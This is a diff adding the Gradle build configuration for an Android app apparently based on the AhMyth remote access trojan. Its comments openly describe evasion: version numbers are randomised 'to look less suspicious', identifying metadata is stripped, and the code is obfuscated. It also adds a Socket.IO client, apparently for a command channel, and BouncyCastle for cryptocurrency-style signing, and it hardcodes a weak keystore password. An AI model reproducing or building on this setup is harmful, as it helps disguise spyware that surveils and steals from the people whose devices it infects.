@@ -1,0 +1,133 @@
+plugins {
+    id 'com.android.application'
+}
+
+android {
+    namespace 'ahmyth.mine.king.ahmyth'
+    compileSdk 34
+    
+    defaultConfig {
+        applicationId "ahmyth.mine.king.ahmyth"
+        minSdk 21
+        targetSdk 34
+        versionCode 2
+        versionName "2.0"
+        
+        testInstrumentationRunner "android.support.test.runner.AndroidJUnitRunner"
+        
+        // Enable multidex for larger apps
+        multiDexEnabled true
+        
+        // Randomize version to look less suspicious
+        def random = new Random()
+        versionCode random.nextInt(100) + 1
+        versionName "${random.nextInt(5) + 1}.${random.nextInt(10)}.${random.nextInt(100)}"
+    }
+    
+    compileOptions {
+        sourceCompatibility JavaVersion.VERSION_11
+        targetCompatibility JavaVersion.VERSION_11
+    }
+    
+    lint {
+        abortOnError false
+        checkReleaseBuilds false
+        disable 'MissingTranslation', 'ExtraTranslation'
+    }
+    
+    signingConfigs {
+        release {
+            storeFile file('release.keystore')
+            storePassword 'android'
+            keyAlias 'release'
+            keyPassword 'android'
+        }
+    }
+    
+    buildTypes {
+        release {
+            minifyEnabled true
+            shrinkResources true
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+            // Remove debug info
+            debuggable false
+            jniDebuggable false
+            signingConfig signingConfigs.release
+            
+            // Additional R8 optimizations
+            ndk {
+                debugSymbolLevel 'NONE'
+            }
+            
+            // Optimize with R8 full mode
+            android.buildFeatures.buildConfig = true
+        }
+        debug {
+            // Disable obfuscation for testing connectivity
+            minifyEnabled false
+            shrinkResources false
+            debuggable true
+            signingConfig signingConfigs.release
+        }
+    }
+    
+    // Enable R8 full mode for better obfuscation
+    buildFeatures {
+        buildConfig = true
+    }
+    
+    testOptions {
+        unitTests {
+            includeAndroidResources = true
+            returnDefaultValues = true
+        }
+        animationsDisabled = true
+    }
+    
+    packagingOptions {
+        // Remove metadata that could identify the app
+        exclude 'META-INF/DEPENDENCIES'
+        exclude 'META-INF/LICENSE'
+        exclude 'META-INF/LICENSE.txt'
+        exclude 'META-INF/license.txt'
+        exclude 'META-INF/NOTICE'
+        exclude 'META-INF/NOTICE.txt'
+        exclude 'META-INF/notice.txt'
+        exclude 'META-INF/ASL2.0'
+        exclude 'META-INF/*.kotlin_module'
+        exclude 'META-INF/maven/**'
+        exclude 'META-INF/proguard/**'
+        exclude 'DebugProbesKt.bin'
+        exclude 'kotlin/**'
+    }
+}
+
+dependencies {
+    // Android Support Libraries
+    implementation 'com.android.support:support-compat:28.0.0'
+    implementation 'com.android.support:support-v4:28.0.0'
+    implementation 'com.android.support:appcompat-v7:28.0.0'
+    
+    // Multidex support
+    implementation 'com.android.support:multidex:1.0.3'
+    
+    // Socket.IO client for real-time communication
+    implementation('io.socket:socket.io-client:2.1.0') {
+        exclude group: 'org.json', module: 'json'
+    }
+
+    // BouncyCastle for Keccak and secp256k1 signing
+    implementation 'org.bouncycastle:bcprov-jdk15to18:1.78.1'
+
+    // Local JAR files
+    implementation fileTree(dir: 'libs', include: ['*.jar'])
+    
+    // Testing dependencies
+    testImplementation 'junit:junit:4.13.2'
+    testImplementation 'org.mockito:mockito-core:3.12.4'
+    androidTestImplementation('com.android.support.test.espresso:espresso-core:3.0.2') {
+        exclude group: 'com.android.support', module: 'support-annotations'
+    }
+    androidTestImplementation 'com.android.support.test:runner:1.0.2'
+    androidTestImplementation 'com.android.support.test:rules:1.0.2'
+}
